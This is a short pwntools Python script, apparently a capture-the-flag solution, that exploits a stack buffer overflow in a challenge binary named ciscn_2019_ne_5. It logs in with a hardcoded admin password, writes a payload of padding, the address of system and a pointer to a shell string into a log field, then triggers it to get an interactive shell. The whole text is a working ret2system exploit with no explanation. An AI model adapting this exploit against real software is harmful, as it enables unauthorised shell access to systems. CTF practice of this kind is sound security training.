from pwn import *
context.log_level = 'debug'
elf = ELF('./ciscn_2019_ne_5')
io = process('./ciscn_2019_ne_5')
#io = gdb.debug('./ciscn_2019_ne_5','break *080486C7')
io.sendlineafter(b'Please input admin password:',b'administrator')
io.sendlineafter(b':\n',b'1')
payload1 = b'A'*0x4C+p32(elf.sym['system'])+p32(0xdeadbeef)+p32(0x080482ea)
io.sendlineafter(b'Please input new log info:',payload1)
io.sendlineafter(b':\n',b'4')
io.interactive()
